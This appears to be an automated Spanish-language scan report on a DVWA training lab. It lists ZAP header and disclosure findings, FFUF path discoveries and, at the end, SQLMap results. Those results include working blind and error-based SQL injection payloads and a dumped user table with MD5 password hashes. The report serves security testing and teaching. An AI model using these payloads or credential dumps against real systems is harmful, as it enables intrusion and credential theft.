# Reporte Consolidado de Seguridad
**Fecha de generación:** 2026-08-05 19:53:35

## Estadísticas Generales
- **Total de URLs únicas analizadas:** 34
- **URLs descubiertas por Spider:** 24
- **Alertas identificadas por ZAP:** 37
- **Rutas descubiertas por FFUF:** 8
- **Vulnerabilidades detectadas por SQLMap:** 4

## Detalles Técnicos: Alertas de ZAP
### Content Security Policy (CSP) Header Not Set
- **Severidad:** Medium (High)
- **URL:** `http://dvwa/about.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor no envía ninguna cabecera Content-Security-Policy. Esta cabecera le dice al navegador desde qué orígenes puede cargar scripts, imágenes, estilos, etc.
- **¿Cuál es el peligro real?** Sin esta cabecera, el navegador no tiene ninguna restricción extra: si un atacante logra inyectar código (por ejemplo un ataque XSS), ese script se va a ejecutar sin obstáculos, pudiendo robar cookies de sesión, credenciales o redirigir al usuario a un sitio falso.
- **Cómo mitigarlo:** Configurar una cabecera Content-Security-Policy que restrinja explícitamente los orígenes permitidos para scripts, estilos, imágenes y otros recursos.

---
### Content Security Policy (CSP) Header Not Set
- **Severidad:** Medium (High)
- **URL:** `http://dvwa/instructions.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor no envía ninguna cabecera Content-Security-Policy. Esta cabecera le dice al navegador desde qué orígenes puede cargar scripts, imágenes, estilos, etc.
- **¿Cuál es el peligro real?** Sin esta cabecera, el navegador no tiene ninguna restricción extra: si un atacante logra inyectar código (por ejemplo un ataque XSS), ese script se va a ejecutar sin obstáculos, pudiendo robar cookies de sesión, credenciales o redirigir al usuario a un sitio falso.
- **Cómo mitigarlo:** Configurar una cabecera Content-Security-Policy que restrinja explícitamente los orígenes permitidos para scripts, estilos, imágenes y otros recursos.

---
### Content Security Policy (CSP) Header Not Set
- **Severidad:** Medium (High)
- **URL:** `http://dvwa/login.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor no envía ninguna cabecera Content-Security-Policy. Esta cabecera le dice al navegador desde qué orígenes puede cargar scripts, imágenes, estilos, etc.
- **¿Cuál es el peligro real?** Sin esta cabecera, el navegador no tiene ninguna restricción extra: si un atacante logra inyectar código (por ejemplo un ataque XSS), ese script se va a ejecutar sin obstáculos, pudiendo robar cookies de sesión, credenciales o redirigir al usuario a un sitio falso.
- **Cómo mitigarlo:** Configurar una cabecera Content-Security-Policy que restrinja explícitamente los orígenes permitidos para scripts, estilos, imágenes y otros recursos.

---
### Content Security Policy (CSP) Header Not Set
- **Severidad:** Medium (High)
- **URL:** `http://dvwa/setup.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor no envía ninguna cabecera Content-Security-Policy. Esta cabecera le dice al navegador desde qué orígenes puede cargar scripts, imágenes, estilos, etc.
- **¿Cuál es el peligro real?** Sin esta cabecera, el navegador no tiene ninguna restricción extra: si un atacante logra inyectar código (por ejemplo un ataque XSS), ese script se va a ejecutar sin obstáculos, pudiendo robar cookies de sesión, credenciales o redirigir al usuario a un sitio falso.
- **Cómo mitigarlo:** Configurar una cabecera Content-Security-Policy que restrinja explícitamente los orígenes permitidos para scripts, estilos, imágenes y otros recursos.

---
### Content Security Policy (CSP) Header Not Set
- **Severidad:** Medium (High)
- **URL:** `http://dvwa/sitemap.xml`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor no envía ninguna cabecera Content-Security-Policy. Esta cabecera le dice al navegador desde qué orígenes puede cargar scripts, imágenes, estilos, etc.
- **¿Cuál es el peligro real?** Sin esta cabecera, el navegador no tiene ninguna restricción extra: si un atacante logra inyectar código (por ejemplo un ataque XSS), ese script se va a ejecutar sin obstáculos, pudiendo robar cookies de sesión, credenciales o redirigir al usuario a un sitio falso.
- **Cómo mitigarlo:** Configurar una cabecera Content-Security-Policy que restrinja explícitamente los orígenes permitidos para scripts, estilos, imágenes y otros recursos.

---
### Directory Browsing
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/docs/`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor tiene habilitado el listado de contenido de carpetas: al entrar a una ruta sin un archivo índice, muestra todos los archivos que contiene en vez de dar un error.
- **¿Cuál es el peligro real?** Expone la estructura interna del sitio y puede revelar archivos que no deberían ser públicos: backups, archivos de configuración, código fuente, credenciales, o versiones antiguas de páginas con otras vulnerabilidades.
- **Cómo mitigarlo:** Desactivar el listado de directorios en la configuración del servidor web (por ejemplo Options -Indexes en Apache) y restringir el acceso a archivos sensibles.

---
### Directory Browsing
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/dvwa/`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor tiene habilitado el listado de contenido de carpetas: al entrar a una ruta sin un archivo índice, muestra todos los archivos que contiene en vez de dar un error.
- **¿Cuál es el peligro real?** Expone la estructura interna del sitio y puede revelar archivos que no deberían ser públicos: backups, archivos de configuración, código fuente, credenciales, o versiones antiguas de páginas con otras vulnerabilidades.
- **Cómo mitigarlo:** Desactivar el listado de directorios en la configuración del servidor web (por ejemplo Options -Indexes en Apache) y restringir el acceso a archivos sensibles.

---
### Directory Browsing
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/dvwa/css/`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor tiene habilitado el listado de contenido de carpetas: al entrar a una ruta sin un archivo índice, muestra todos los archivos que contiene en vez de dar un error.
- **¿Cuál es el peligro real?** Expone la estructura interna del sitio y puede revelar archivos que no deberían ser públicos: backups, archivos de configuración, código fuente, credenciales, o versiones antiguas de páginas con otras vulnerabilidades.
- **Cómo mitigarlo:** Desactivar el listado de directorios en la configuración del servidor web (por ejemplo Options -Indexes en Apache) y restringir el acceso a archivos sensibles.

---
### Directory Browsing
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/dvwa/images/`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor tiene habilitado el listado de contenido de carpetas: al entrar a una ruta sin un archivo índice, muestra todos los archivos que contiene en vez de dar un error.
- **¿Cuál es el peligro real?** Expone la estructura interna del sitio y puede revelar archivos que no deberían ser públicos: backups, archivos de configuración, código fuente, credenciales, o versiones antiguas de páginas con otras vulnerabilidades.
- **Cómo mitigarlo:** Desactivar el listado de directorios en la configuración del servidor web (por ejemplo Options -Indexes en Apache) y restringir el acceso a archivos sensibles.

---
### Directory Browsing
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/dvwa/js/`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor tiene habilitado el listado de contenido de carpetas: al entrar a una ruta sin un archivo índice, muestra todos los archivos que contiene en vez de dar un error.
- **¿Cuál es el peligro real?** Expone la estructura interna del sitio y puede revelar archivos que no deberían ser públicos: backups, archivos de configuración, código fuente, credenciales, o versiones antiguas de páginas con otras vulnerabilidades.
- **Cómo mitigarlo:** Desactivar el listado de directorios en la configuración del servidor web (por ejemplo Options -Indexes en Apache) y restringir el acceso a archivos sensibles.

---
### HTTP Only Site
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El sitio (o parte de él) es accesible por HTTP sin cifrar, en vez de forzar siempre HTTPS.
- **¿Cuál es el peligro real?** Toda la información viaja en texto plano por la red: cualquiera que intercepte el tráfico (en una red WiFi pública, por ejemplo) puede leer usuarios, contraseñas, cookies de sesión y datos personales, o incluso modificar el contenido de la página en tránsito.
- **Cómo mitigarlo:** Forzar HTTPS en todo el sitio, redirigiendo automáticamente el tráfico HTTP a HTTPS y usando la cabecera Strict-Transport-Security (HSTS).

---
### Missing Anti-clickjacking Header
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/about.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Frame-Options (o la directiva frame-ancestors en CSP), que evita que la página pueda cargarse dentro de un <iframe> en otro sitio.
- **¿Cuál es el peligro real?** Permite un ataque de clickjacking: un atacante crea una página propia que carga tu sitio en un iframe invisible superpuesto sobre botones falsos. La víctima cree que hace clic en el contenido del atacante, pero en realidad está haciendo clic en tu sitio real (por ejemplo, confirmando una acción sensible sin saberlo).
- **Cómo mitigarlo:** Agregar la cabecera X-Frame-Options: DENY (o SAMEORIGIN si hace falta) y/o la directiva frame-ancestors en la CSP.

---
### Missing Anti-clickjacking Header
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/instructions.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Frame-Options (o la directiva frame-ancestors en CSP), que evita que la página pueda cargarse dentro de un <iframe> en otro sitio.
- **¿Cuál es el peligro real?** Permite un ataque de clickjacking: un atacante crea una página propia que carga tu sitio en un iframe invisible superpuesto sobre botones falsos. La víctima cree que hace clic en el contenido del atacante, pero en realidad está haciendo clic en tu sitio real (por ejemplo, confirmando una acción sensible sin saberlo).
- **Cómo mitigarlo:** Agregar la cabecera X-Frame-Options: DENY (o SAMEORIGIN si hace falta) y/o la directiva frame-ancestors en la CSP.

---
### Missing Anti-clickjacking Header
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/instructions.php?doc=readme`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Frame-Options (o la directiva frame-ancestors en CSP), que evita que la página pueda cargarse dentro de un <iframe> en otro sitio.
- **¿Cuál es el peligro real?** Permite un ataque de clickjacking: un atacante crea una página propia que carga tu sitio en un iframe invisible superpuesto sobre botones falsos. La víctima cree que hace clic en el contenido del atacante, pero en realidad está haciendo clic en tu sitio real (por ejemplo, confirmando una acción sensible sin saberlo).
- **Cómo mitigarlo:** Agregar la cabecera X-Frame-Options: DENY (o SAMEORIGIN si hace falta) y/o la directiva frame-ancestors en la CSP.

---
### Missing Anti-clickjacking Header
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/login.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Frame-Options (o la directiva frame-ancestors en CSP), que evita que la página pueda cargarse dentro de un <iframe> en otro sitio.
- **¿Cuál es el peligro real?** Permite un ataque de clickjacking: un atacante crea una página propia que carga tu sitio en un iframe invisible superpuesto sobre botones falsos. La víctima cree que hace clic en el contenido del atacante, pero en realidad está haciendo clic en tu sitio real (por ejemplo, confirmando una acción sensible sin saberlo).
- **Cómo mitigarlo:** Agregar la cabecera X-Frame-Options: DENY (o SAMEORIGIN si hace falta) y/o la directiva frame-ancestors en la CSP.

---
### Missing Anti-clickjacking Header
- **Severidad:** Medium (Medium)
- **URL:** `http://dvwa/setup.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Frame-Options (o la directiva frame-ancestors en CSP), que evita que la página pueda cargarse dentro de un <iframe> en otro sitio.
- **¿Cuál es el peligro real?** Permite un ataque de clickjacking: un atacante crea una página propia que carga tu sitio en un iframe invisible superpuesto sobre botones falsos. La víctima cree que hace clic en el contenido del atacante, pero en realidad está haciendo clic en tu sitio real (por ejemplo, confirmando una acción sensible sin saberlo).
- **Cómo mitigarlo:** Agregar la cabecera X-Frame-Options: DENY (o SAMEORIGIN si hace falta) y/o la directiva frame-ancestors en la CSP.

---
### In Page Banner Information Leak
- **Severidad:** Low (High)
- **URL:** `http://dvwa/sitemap.xml`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** La página muestra en su propio contenido (banners, pies de página, mensajes de error) información técnica como versiones de software, nombres de tecnologías o rutas internas.
- **¿Cuál es el peligro real?** Le facilita el trabajo a un atacante: sabiendo la versión exacta del software usado, puede buscar directamente vulnerabilidades ya conocidas (CVEs) para esa versión en vez de tener que descubrirlas.
- **Cómo mitigarlo:** Quitar de las páginas y mensajes de error cualquier dato de versión, tecnología o información interna que no sea necesaria para el usuario final.

---
### In Page Banner Information Leak
- **Severidad:** Low (High)
- **URL:** `http://dvwa/var/www/html/config/config.inc.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** La página muestra en su propio contenido (banners, pies de página, mensajes de error) información técnica como versiones de software, nombres de tecnologías o rutas internas.
- **¿Cuál es el peligro real?** Le facilita el trabajo a un atacante: sabiendo la versión exacta del software usado, puede buscar directamente vulnerabilidades ya conocidas (CVEs) para esa versión en vez de tener que descubrirlas.
- **Cómo mitigarlo:** Quitar de las páginas y mensajes de error cualquier dato de versión, tecnología o información interna que no sea necesaria para el usuario final.

---
### Information Disclosure - Debug Error Messages
- **Severidad:** Low (Medium)
- **URL:** `http://dvwa/instructions.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Ante un error, la aplicación muestra mensajes de depuración (debug) completos: trazas de código, rutas del servidor, consultas SQL, nombres de variables, etc., en vez de un mensaje de error genérico.
- **¿Cuál es el peligro real?** Estos mensajes revelan detalles internos de cómo está construida la aplicación (frameworks, estructura de base de datos, rutas de archivos), información que un atacante usa para planear ataques más precisos, como inyección SQL dirigida.
- **Cómo mitigarlo:** Desactivar el modo debug en producción y mostrar siempre mensajes de error genéricos al usuario, registrando el detalle técnico solo en logs internos del servidor.

---
### Information Disclosure - Debug Error Messages
- **Severidad:** Low (Medium)
- **URL:** `http://dvwa/instructions.php?doc=readme`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Ante un error, la aplicación muestra mensajes de depuración (debug) completos: trazas de código, rutas del servidor, consultas SQL, nombres de variables, etc., en vez de un mensaje de error genérico.
- **¿Cuál es el peligro real?** Estos mensajes revelan detalles internos de cómo está construida la aplicación (frameworks, estructura de base de datos, rutas de archivos), información que un atacante usa para planear ataques más precisos, como inyección SQL dirigida.
- **Cómo mitigarlo:** Desactivar el modo debug en producción y mostrar siempre mensajes de error genéricos al usuario, registrando el detalle técnico solo en logs internos del servidor.

---
### Server Leaks Version Information via "Server" HTTP Response Header Field
- **Severidad:** Low (High)
- **URL:** `http://dvwa`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor responde con una cabecera "Server" que indica el software y la versión exacta que está corriendo (por ejemplo Apache/2.4.41).
- **¿Cuál es el peligro real?** Un atacante puede buscar directamente vulnerabilidades públicas conocidas (CVEs) para esa versión específica, ahorrándose el trabajo de descubrirlas y apuntando el ataque con mucha más precisión.
- **Cómo mitigarlo:** Configurar el servidor para ocultar o generalizar la cabecera Server (sin exponer la versión exacta del software).

---
### Server Leaks Version Information via "Server" HTTP Response Header Field
- **Severidad:** Low (High)
- **URL:** `http://dvwa/dvwa/css/login.css`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor responde con una cabecera "Server" que indica el software y la versión exacta que está corriendo (por ejemplo Apache/2.4.41).
- **¿Cuál es el peligro real?** Un atacante puede buscar directamente vulnerabilidades públicas conocidas (CVEs) para esa versión específica, ahorrándose el trabajo de descubrirlas y apuntando el ataque con mucha más precisión.
- **Cómo mitigarlo:** Configurar el servidor para ocultar o generalizar la cabecera Server (sin exponer la versión exacta del software).

---
### Server Leaks Version Information via "Server" HTTP Response Header Field
- **Severidad:** Low (High)
- **URL:** `http://dvwa/login.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor responde con una cabecera "Server" que indica el software y la versión exacta que está corriendo (por ejemplo Apache/2.4.41).
- **¿Cuál es el peligro real?** Un atacante puede buscar directamente vulnerabilidades públicas conocidas (CVEs) para esa versión específica, ahorrándose el trabajo de descubrirlas y apuntando el ataque con mucha más precisión.
- **Cómo mitigarlo:** Configurar el servidor para ocultar o generalizar la cabecera Server (sin exponer la versión exacta del software).

---
### Server Leaks Version Information via "Server" HTTP Response Header Field
- **Severidad:** Low (High)
- **URL:** `http://dvwa/robots.txt`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor responde con una cabecera "Server" que indica el software y la versión exacta que está corriendo (por ejemplo Apache/2.4.41).
- **¿Cuál es el peligro real?** Un atacante puede buscar directamente vulnerabilidades públicas conocidas (CVEs) para esa versión específica, ahorrándose el trabajo de descubrirlas y apuntando el ataque con mucha más precisión.
- **Cómo mitigarlo:** Configurar el servidor para ocultar o generalizar la cabecera Server (sin exponer la versión exacta del software).

---
### Server Leaks Version Information via "Server" HTTP Response Header Field
- **Severidad:** Low (High)
- **URL:** `http://dvwa/sitemap.xml`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El servidor responde con una cabecera "Server" que indica el software y la versión exacta que está corriendo (por ejemplo Apache/2.4.41).
- **¿Cuál es el peligro real?** Un atacante puede buscar directamente vulnerabilidades públicas conocidas (CVEs) para esa versión específica, ahorrándose el trabajo de descubrirlas y apuntando el ataque con mucha más precisión.
- **Cómo mitigarlo:** Configurar el servidor para ocultar o generalizar la cabecera Server (sin exponer la versión exacta del software).

---
### X-Content-Type-Options Header Missing
- **Severidad:** Low (Medium)
- **URL:** `http://dvwa/dvwa/css/login.css`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Content-Type-Options: nosniff, que le indica al navegador que respete estrictamente el tipo de contenido (Content-Type) declarado por el servidor.
- **¿Cuál es el peligro real?** Sin esta cabecera, algunos navegadores intentan 'adivinar' el tipo de archivo (MIME sniffing). Un atacante puede aprovechar esto para que un archivo subido como imagen o texto sea interpretado y ejecutado como JavaScript, habilitando ataques XSS.
- **Cómo mitigarlo:** Agregar la cabecera X-Content-Type-Options: nosniff en todas las respuestas del servidor.

---
### X-Content-Type-Options Header Missing
- **Severidad:** Low (Medium)
- **URL:** `http://dvwa/dvwa/images/RandomStorm.png`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Content-Type-Options: nosniff, que le indica al navegador que respete estrictamente el tipo de contenido (Content-Type) declarado por el servidor.
- **¿Cuál es el peligro real?** Sin esta cabecera, algunos navegadores intentan 'adivinar' el tipo de archivo (MIME sniffing). Un atacante puede aprovechar esto para que un archivo subido como imagen o texto sea interpretado y ejecutado como JavaScript, habilitando ataques XSS.
- **Cómo mitigarlo:** Agregar la cabecera X-Content-Type-Options: nosniff en todas las respuestas del servidor.

---
### X-Content-Type-Options Header Missing
- **Severidad:** Low (Medium)
- **URL:** `http://dvwa/dvwa/images/login_logo.png`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Content-Type-Options: nosniff, que le indica al navegador que respete estrictamente el tipo de contenido (Content-Type) declarado por el servidor.
- **¿Cuál es el peligro real?** Sin esta cabecera, algunos navegadores intentan 'adivinar' el tipo de archivo (MIME sniffing). Un atacante puede aprovechar esto para que un archivo subido como imagen o texto sea interpretado y ejecutado como JavaScript, habilitando ataques XSS.
- **Cómo mitigarlo:** Agregar la cabecera X-Content-Type-Options: nosniff en todas las respuestas del servidor.

---
### X-Content-Type-Options Header Missing
- **Severidad:** Low (Medium)
- **URL:** `http://dvwa/login.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Content-Type-Options: nosniff, que le indica al navegador que respete estrictamente el tipo de contenido (Content-Type) declarado por el servidor.
- **¿Cuál es el peligro real?** Sin esta cabecera, algunos navegadores intentan 'adivinar' el tipo de archivo (MIME sniffing). Un atacante puede aprovechar esto para que un archivo subido como imagen o texto sea interpretado y ejecutado como JavaScript, habilitando ataques XSS.
- **Cómo mitigarlo:** Agregar la cabecera X-Content-Type-Options: nosniff en todas las respuestas del servidor.

---
### X-Content-Type-Options Header Missing
- **Severidad:** Low (Medium)
- **URL:** `http://dvwa/robots.txt`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** Al sitio le falta la cabecera X-Content-Type-Options: nosniff, que le indica al navegador que respete estrictamente el tipo de contenido (Content-Type) declarado por el servidor.
- **¿Cuál es el peligro real?** Sin esta cabecera, algunos navegadores intentan 'adivinar' el tipo de archivo (MIME sniffing). Un atacante puede aprovechar esto para que un archivo subido como imagen o texto sea interpretado y ejecutado como JavaScript, habilitando ataques XSS.
- **Cómo mitigarlo:** Agregar la cabecera X-Content-Type-Options: nosniff en todas las respuestas del servidor.

---
### Authentication Request Identified
- **Severidad:** Informational (High)
- **URL:** `http://dvwa/login.php`
- **Método:** POST
- **¿Qué es esta vulnerabilidad?** ZAP detectó automáticamente un endpoint que parece ser un formulario o pedido de login (usuario/contraseña).
- **¿Cuál es el peligro real?** No es una vulnerabilidad en sí misma, es solo información: indica dónde está el punto de autenticación, lo cual sirve como mapa de ataque para probar fuerza bruta, credenciales por defecto o bypass de login sobre ese endpoint puntual.
- **Cómo mitigarlo:** Asegurarse de que ese endpoint tenga límite de intentos (rate limiting), captcha y bloqueo de cuenta tras varios fallos.

---
### Information Disclosure - Suspicious Comments
- **Severidad:** Informational (Medium)
- **URL:** `http://dvwa/setup.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** El código fuente HTML/JS que llega al navegador contiene comentarios sospechosos dejados por los desarrolladores (por ejemplo TODO, FIXME, credenciales de prueba, rutas internas o notas de debug).
- **¿Cuál es el peligro real?** Cualquier persona puede ver el código fuente de la página desde el navegador y leer esos comentarios, que muchas veces revelan información interna, credenciales de prueba olvidadas o pistas sobre fallas conocidas del sistema.
- **Cómo mitigarlo:** Eliminar todo comentario de desarrollo antes de publicar en producción, idealmente automatizando esta limpieza en el proceso de build/deploy.

---
### User Agent Fuzzer
- **Severidad:** Informational (Medium)
- **URL:** `http://dvwa`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** ZAP probó enviar distintos valores de cabecera User-Agent (navegador, bot, dispositivo falso) para ver si la aplicación se comporta distinto o revela algo según el User-Agent recibido.
- **¿Cuál es el peligro real?** Por sí sola es una prueba informativa. El riesgo real depende de lo que haya encontrado: si la aplicación confía ciegamente en el User-Agent para tomar decisiones de seguridad (por ejemplo, saltarse validaciones para 'bots'), eso sí sería explotable.
- **Cómo mitigarlo:** No tomar decisiones de seguridad basadas en la cabecera User-Agent, ya que el atacante puede modificarla libremente.

---
### User Agent Fuzzer
- **Severidad:** Informational (Medium)
- **URL:** `http://dvwa/`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** ZAP probó enviar distintos valores de cabecera User-Agent (navegador, bot, dispositivo falso) para ver si la aplicación se comporta distinto o revela algo según el User-Agent recibido.
- **¿Cuál es el peligro real?** Por sí sola es una prueba informativa. El riesgo real depende de lo que haya encontrado: si la aplicación confía ciegamente en el User-Agent para tomar decisiones de seguridad (por ejemplo, saltarse validaciones para 'bots'), eso sí sería explotable.
- **Cómo mitigarlo:** No tomar decisiones de seguridad basadas en la cabecera User-Agent, ya que el atacante puede modificarla libremente.

---
### User Agent Fuzzer
- **Severidad:** Informational (Medium)
- **URL:** `http://dvwa/about.php`
- **Método:** GET
- **¿Qué es esta vulnerabilidad?** ZAP probó enviar distintos valores de cabecera User-Agent (navegador, bot, dispositivo falso) para ver si la aplicación se comporta distinto o revela algo según el User-Agent recibido.
- **¿Cuál es el peligro real?** Por sí sola es una prueba informativa. El riesgo real depende de lo que haya encontrado: si la aplicación confía ciegamente en el User-Agent para tomar decisiones de seguridad (por ejemplo, saltarse validaciones para 'bots'), eso sí sería explotable.
- **Cómo mitigarlo:** No tomar decisiones de seguridad basadas en la cabecera User-Agent, ya que el atacante puede modificarla libremente.

---
### User Agent Fuzzer
- **Severidad:** Informational (Medium)
- **URL:** `http://dvwa/login.php`
- **Método:** POST
- **¿Qué es esta vulnerabilidad?** ZAP probó enviar distintos valores de cabecera User-Agent (navegador, bot, dispositivo falso) para ver si la aplicación se comporta distinto o revela algo según el User-Agent recibido.
- **¿Cuál es el peligro real?** Por sí sola es una prueba informativa. El riesgo real depende de lo que haya encontrado: si la aplicación confía ciegamente en el User-Agent para tomar decisiones de seguridad (por ejemplo, saltarse validaciones para 'bots'), eso sí sería explotable.
- **Cómo mitigarlo:** No tomar decisiones de seguridad basadas en la cabecera User-Agent, ya que el atacante puede modificarla libremente.

---
### User Agent Fuzzer
- **Severidad:** Informational (Medium)
- **URL:** `http://dvwa/setup.php`
- **Método:** POST
- **¿Qué es esta vulnerabilidad?** ZAP probó enviar distintos valores de cabecera User-Agent (navegador, bot, dispositivo falso) para ver si la aplicación se comporta distinto o revela algo según el User-Agent recibido.
- **¿Cuál es el peligro real?** Por sí sola es una prueba informativa. El riesgo real depende de lo que haya encontrado: si la aplicación confía ciegamente en el User-Agent para tomar decisiones de seguridad (por ejemplo, saltarse validaciones para 'bots'), eso sí sería explotable.
- **Cómo mitigarlo:** No tomar decisiones de seguridad basadas en la cabecera User-Agent, ya que el atacante puede modificarla libremente.

---
## Detalles Técnicos: Rutas Ocultas o Sensibles (FFUF)
### Directorio/Archivo Sensible o Expuesto
- **Severidad:** Low (Informational)
- **URL:** `http://dvwa/about.php`
- **Método:** GET
- **Descripción:** Archivo o directorio descubierto (HTTP Status: 200, Lines: N/A, Words: N/A)
- **Solución:** <p>Verifique si este recurso debe ser público. Si contiene información confidencial, configure controles de acceso o retírelo del servidor.</p>

---
### Directorio/Archivo Sensible o Expuesto
- **Severidad:** Low (Informational)
- **URL:** `http://dvwa/index.php`
- **Método:** GET
- **Descripción:** Archivo o directorio descubierto (HTTP Status: 302, Lines: N/A, Words: N/A)
- **Solución:** <p>Verifique si este recurso debe ser público. Si contiene información confidencial, configure controles de acceso o retírelo del servidor.</p>

---
### Directorio/Archivo Sensible o Expuesto
- **Severidad:** Low (Informational)
- **URL:** `http://dvwa/instructions.php`
- **Método:** GET
- **Descripción:** Archivo o directorio descubierto (HTTP Status: 200, Lines: N/A, Words: N/A)
- **Solución:** <p>Verifique si este recurso debe ser público. Si contiene información confidencial, configure controles de acceso o retírelo del servidor.</p>

---
### Directorio/Archivo Sensible o Expuesto
- **Severidad:** Low (Informational)
- **URL:** `http://dvwa/login.php`
- **Método:** GET
- **Descripción:** Archivo o directorio descubierto (HTTP Status: 200, Lines: N/A, Words: N/A)
- **Solución:** <p>Verifique si este recurso debe ser público. Si contiene información confidencial, configure controles de acceso o retírelo del servidor.</p>

---
### Directorio/Archivo Sensible o Expuesto
- **Severidad:** Low (Informational)
- **URL:** `http://dvwa/logout.php`
- **Método:** GET
- **Descripción:** Archivo o directorio descubierto (HTTP Status: 302, Lines: N/A, Words: N/A)
- **Solución:** <p>Verifique si este recurso debe ser público. Si contiene información confidencial, configure controles de acceso o retírelo del servidor.</p>

---
### Directorio/Archivo Sensible o Expuesto
- **Severidad:** Low (Informational)
- **URL:** `http://dvwa/phpinfo.php`
- **Método:** GET
- **Descripción:** Archivo o directorio descubierto (HTTP Status: 302, Lines: N/A, Words: N/A)
- **Solución:** <p>Verifique si este recurso debe ser público. Si contiene información confidencial, configure controles de acceso o retírelo del servidor.</p>

---
### Directorio/Archivo Sensible o Expuesto
- **Severidad:** Low (Informational)
- **URL:** `http://dvwa/security.php`
- **Método:** GET
- **Descripción:** Archivo o directorio descubierto (HTTP Status: 302, Lines: N/A, Words: N/A)
- **Solución:** <p>Verifique si este recurso debe ser público. Si contiene información confidencial, configure controles de acceso o retírelo del servidor.</p>

---
### Directorio/Archivo Sensible o Expuesto
- **Severidad:** Low (Informational)
- **URL:** `http://dvwa/setup.php`
- **Método:** GET
- **Descripción:** Archivo o directorio descubierto (HTTP Status: 200, Lines: N/A, Words: N/A)
- **Solución:** <p>Verifique si este recurso debe ser público. Si contiene información confidencial, configure controles de acceso o retírelo del servidor.</p>

---

## Detalles Técnicos: Inyecciones SQL (SQLMap)
### SQL Injection (MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause)
- **Severidad:** High (High)
- **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
- **Método:** N/A
- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `boolean-based blind`: `username=SCVZ' RLIKE (SELECT (CASE WHEN (4201=4201) THEN 0x5343565a ELSE 0x28 END))-- RmAL&password=Fqvd&Login=Login`

#### Información Extraída (Data Dump)
```text
Volcado de Tabla: dvwa.users (5 registros)

+------------+--------+-------------------------+
| comment_id | name   | comment                 |
+------------+--------+-------------------------+
| 1          | test   | This is a test comment. |
+------------+--------+-------------------------+

+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2026-08-05 19:50:13 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2026-08-05 19:50:13 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2026-08-05 19:50:13 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2026-08-05 19:50:13 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2026-08-05 19:50:13 | 0            |
+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
```

- **Solución:** <p>Use parameterized queries (prepared statements) instead of string concatenation for SQL queries. Use stored procedures. Apply least privilege to the database account.</p>

---
### SQL Injection (MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE))
- **Severidad:** High (High)
- **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
- **Método:** N/A
- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `error-based`: `username=SCVZ' AND EXTRACTVALUE(2489,CONCAT(0x5c,0x7171767071,(SELECT (ELT(2489=2489,1))),0x7171767671))-- DaFN&password=Fqvd&Login=Login`
